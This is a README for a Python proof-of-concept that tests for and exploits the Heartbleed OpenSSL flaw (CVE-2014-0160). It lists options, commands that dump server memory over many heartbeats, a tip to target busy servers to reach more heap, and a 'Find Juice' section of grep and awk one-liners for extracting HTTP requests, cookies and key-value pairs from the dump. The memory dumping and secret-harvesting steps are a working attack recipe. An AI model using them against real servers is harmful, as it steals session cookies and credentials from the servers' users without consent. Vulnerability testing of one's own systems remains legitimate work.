HeartBleed Tester & Exploit
---------------------------

Usage: heartbleed-poc.py server [options]

Test for SSL heartbeat vulnerability (CVE-2014-0160)

Options:
  -h, --help            show this help message and exit
  -p PORT, --port=PORT  TCP port to test (default: 443)
  -n NUM, --num=NUM     Number of heartbeats to send if vulnerable (defines
                        how much memory you get back) (default: 1)
  -f FILE, --file=FILE  Filename to write dumped memory too (default:
                        dump.bin)
  -v VER, --ver=VER     TLS version 1 is 1.0, 2 is 1.1, 3 is 1.2, 0 will try
                        all (default: 0)
  -q, --quiet           Do not display the memory dump
  -s, --starttls        Check STARTTLS (smtp only right now) 

Examples
--------

* Normal scan, will hit port 443, attempt all TLS versions with 1 iteration):
python heartbleed-poc.py example.com

* Dump memory scan, will make 100 request and put the output in the binary file dump.bin:
python heartbleed-poc.py -n100 -f dump.bin example.com

The make sure you get different parts of the HEAP, make sure the server is busy, or you end up with repeat repeat.

* Check a mail server with STARTTLS (i.e. port 25):
python heartbleed-poc.py -s -p 25 example.com

* Make the TLS version explicit (TLS v1.1 most commonly vulnerable):
python heartbleed-poc.py -v 1 example.com

Find Juice
----------

The binary file will have juicy output in it, here are some simple ways of finding the goods:

* HTTP request:
awk '/[HPG][UEO][AST][DT ]/,/Connection/' dump.bin

* Cookies:
grep -a "^Cookie:" dump.bin

* Interesting Key Value Pairs:
grep -a "\&" dump.bin|grep -av "[\<\>]"|grep -ai "[a-z0-9_-]*=[0-9a-z]*"
